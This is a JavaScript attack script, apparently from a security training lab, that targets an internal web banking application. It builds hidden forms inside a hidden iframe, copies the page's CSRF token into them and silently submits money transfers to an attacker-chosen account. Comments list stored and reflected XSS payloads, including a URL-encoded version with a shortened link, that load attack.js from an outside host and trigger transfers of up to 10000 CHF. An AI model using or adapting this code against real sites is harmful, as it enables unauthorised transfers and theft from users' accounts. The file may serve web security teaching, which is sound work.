function transferCSRF(formname, fromAccount, toAccount, amount, currency) {
    addTransferForm(formname, fromAccount, toAccount, amount, currency, "http://sprg-vbank.el.eee.intern/doTransfer");
    document.getElementById(formname).submit();
}

function transfer(formname, fromAccount, toAccount, amount, currency, action) {
    if (addTransferForm(formname, fromAccount, toAccount, amount, currency, "/doTransfer")) {
        var submitFunction = function () {
            submitTransferForm(formname, fromAccount);
        };
        submitFunction();
    }
}

function addTransferForm(formname, fromAccount, toAccount, amount, currency, action) {
    if (!document.getElementById("hiddenFrame")) {
        var ifr = document.createElement("iframe");
        ifr.name = "hiddenFrame";
        ifr.style = "display:none";
        document.body.appendChild(ifr);
    }
    if (!formname) {
        formname = generateId(10);
    }
    if (!document.getElementById(formname)) {
        var form = createHiddenForm(formname, "hiddenFrame", action)
        createHiddenInput(form, "fromAccountNo", fromAccount);
        createHiddenInput(form, "toAccountNo", toAccount);
        createHiddenInput(form, "amount", amount);
        createHiddenInput(form, "currency", currency);
        createHiddenInput(form, "note", '<span id="note_' + formname + '"></span>hello XSS');
        var csrfToken = document.querySelector("meta[name='_csrf']").getAttribute("content");
        if (csrfToken) {
            createHiddenInput(form, "_csrf", csrfToken);
        }
        return true;
    }
    return false;
}

function createHiddenForm(formname, target, action) {
    var form = document.createElement("form");
    form.action = action;
    form.method = "post";
    form.target = target;
    form.id = formname;
    form.style = "display:none";
    form.style.visible = false;
    document.body.appendChild(form);
    return form;
}

function createHiddenInput(form, name, value) {
    var input = document.createElement("input");
    input.name = name;
    input.type = "hidden";
    input.value = value;
    form.appendChild(input);
    return input;
}

function submitTransferForm(formname, fromAccount) {
    var isAccOwner = document.getElementById("title").textContent.indexOf(fromAccount) >= 0;
    var alreadyDone = document.getElementById("note_" + formname);
    if (isAccOwner && !alreadyDone) {
        console.log("Submitting : " + formname);
        document.getElementById(formname).submit();
    } else {
        console.log("NOT submitting : " + formname);
    }
}
//persisted XSS:
//<script src="http://sprg-tools.el.eee.intern:9090/files/vargadan/attack.js"></script><script>transfer("attackForm1","FROM_ACCOUNT_NO","TO_ACCOUNT_NO","100","CHF")</script>
//<script src="http://sprg-owasp.el.eee.intern:9090/files/vargadan/attack.js"></script><script>transfer("attackForm1","FROM_ACCOUNT_NO","TO_ACCOUNT_NO","10000","CHF")</script>
//reflected XSS:
//http://sprg-vbank.el.eee.intern/history?accountNo=FROM_ACCOUNT_NO' -- <script src="http://sprg-owasp.el.eee.intern:9090/files/vargadan/attack.js"></script><script>transfer(null,"FROM_ACCOUNT_NO","TO_ACCOUNT_NO","888","CHF")</script>
//URL encoded:
//http%3A%2F%2Fsprg-vbank.el.eee.intern%2Fhistory%3FaccountNo%3DFROM_ACCOUNT_NO%27+--+%3Cscript+src%3D%22http%3A%2F%2Fbit.ly%2F2rvhzPT_attack_js%22%3E%3C%2Fscript%3E%3Cscript%3Etransfer%28null%2C%22FROM_ACCOUNT_NO%22%2C%22TO_ACCOUNT_NO%22%2C%22888%22%2C%22CHF%22%29%3C%2Fscript%3E
// dec2hex :: Integer -> String
function dec2hex (dec) {
    return ('0' + dec.toString(16)).substr(-2)
}

// generateId :: Integer -> String
function generateId (len) {
    var arr = new Uint8Array((len || 40) / 2)
    window.crypto.getRandomValues(arr)
    return Array.from(arr, dec2hex).join('')
}